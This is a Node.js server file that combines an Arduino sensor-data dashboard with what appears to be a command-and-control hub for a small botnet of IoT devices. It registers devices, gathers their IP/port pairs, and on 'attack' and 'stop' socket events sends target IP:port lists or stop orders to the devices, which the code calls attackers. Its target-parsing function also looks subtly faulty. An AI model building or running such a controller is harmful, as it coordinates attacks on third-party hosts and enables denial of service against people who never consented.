var express = require('express');
var app = express();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var bodyParser = require('body-parser');

var knownIds = {};
var ipPortPair = [];
var targetJson = {};
var attack = false;
var stop = false;

app.use(express.static('public'));

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', function(req, res){
  res.sendFile(__dirname + '/index.html');
});

function sensorJSON(datetime, sensorValue, sensorName){
  
  var date = new Date();
  var ms = date.getMilliseconds();

  var data = "";
  data += " { x :[\'" + datetime +'.' + ms + "\'],";
  data += " y :[" + sensorValue + "],";
  data += " name : \'" + sensorName +"\'}";

  return data;
}

app.post("/ips", function(req, res) {

    var ip = req.body.ip;
    var port = req.body.port;
    var ipPort = {};

    ipPort.ip = ip;
    ipPort.port = port;

    ipPortPair.push(ipPort);
    console.log(ipPortPair);
    res.end("ok. IP, port Received");
});


app.post("/", function(req, res){
  
  var id = req.body.id;
  var datetime = req.body.datetime;
  var sensorData = req.body.data;

  //if ID isn't known push it into our knownIds
  if(!(knownIds[id])) 
  {
    //Default delay is 1 second
    knownIds[id] = {time:1000, sent:false, stop:false};
    //console.log(knownIds);
  } 
  else  //Known host
  {
      if(attack)  //Attack order has been sent from the client
      { 
          if(!knownIds[id].sent)  //Attack order hasn't been sent yet to the 
          {                       //attacker
              var content = {};
              content.arduinos = ipPortPair;
              content.targets = targetJson;
              console.log("Content:");
              console.log(content);
              res.setHeader('Content-Type', 'application/json');
              res.send(JSON.stringify(content));
              knownIds[id].sent = true;
              knownIds[id].stop = false;
          }
          else
          {
              console.log("OK");
              res.end("ok");
          }
      }
      else //We're not attacking
      {
          if(stop) //Stop order has been sent from the client
          {
              if(!knownIds[id].stop) //stop hasn't been sent to the attacker yet
              {
                  res.end("stop");
                  knownIds[id].stop = true;
                  knownIds[id].sent = false;
              }
              else
              {
                  console.log("OK");
                  res.end("ok");
              }
          }
          else  //Not attacking, not stopping, just acknowledge 
          {
              console.log("OK");
              res.end("ok");
          }
      }
  }
  
  var date = new Date();
  var ms = date.getMilliseconds();
  req.body.datetime = req.body.datetime + '.' + ms;

  //build the string to show on the clients
  var data = "";
  data += "ID = " + "\"" + id + "\"\n";
  data += "["

  if(sensorData.sensor0)
  {
      data += sensorJSON(datetime, sensorData.sensor0, "sensor0");
      data += ",\n";
  }
  if(sensorData.sensor1)
  {
      data += sensorJSON(datetime, sensorData.sensor1, "sensor1");
      data += " -]";
  }

  io.emit('iot data', data, req.body);

});

function parseTarget(targets) {
    //ip:port, ip:port, ...
    var ips = [];
    var ports = [];
    var targetJson = {};
    var ip, port;

    var ipPortPair, res;

    if(targets.indexOf(",") != -1) 
    {
        //more than one IP:port
        ipPortPair = targets.substring(0, targets.indexOf(","));
        res = targets.substring(targets.indexOf(",")+1);
    } 
    else 
    {
        ipPortPair = targets;
        res = "";
    }

    var finished = false;

    while(!finished)
    {
        ip = ipPortPair.substring(0, ipPortPair.indexOf(":"));
        port = ipPortPair.substring(ipPortPair.indexOf(":") + 1)

        ips.push(ip);
        ports.push(port);

        if(res.indexOf(",") != -1) 
        {
            ipPortPair = res.substring(0, res.indexOf(","));
        } 
        else 
        {
            //last element
            ip = res.substring(0, res.indexOf(":"));
            port = res.substring(res.indexOf(":") + 1);
            ips.push(ip);
            ports.push(port);
            finished = true;
        }

        res = res.substring(res.indexOf(",")+1);
    }

    targetJson.ips = ips;
    targetJson.ports = ports;
    return targetJson;
}

io.on('connection', function(socket){
  console.log('a user connected');

  socket.on('disconnect', function(){
    console.log('user disconnected');
  });

  socket.on('update delay', function(data) {
    console.log('Arduino delay update');
    //console.log('Arduino ' + data.id + ' new delay set to: ' + data.time);
    knownIds[data.id].time = data.time;
    knownIds[data.id].changed = true;
  });

  socket.on('attack', function(targets) {
    targetJson = parseTarget(targets);    
    attack = true;
    stop = false;
    console.log("Attack order received!");
  });

  socket.on('stop', function() {        
    console.log("Stop order received!");
    stop = true;
    attack = false;
  });


});

const PORT = 8080;

http.listen(PORT, function(){
  console.log('listening on: ' + PORT);
});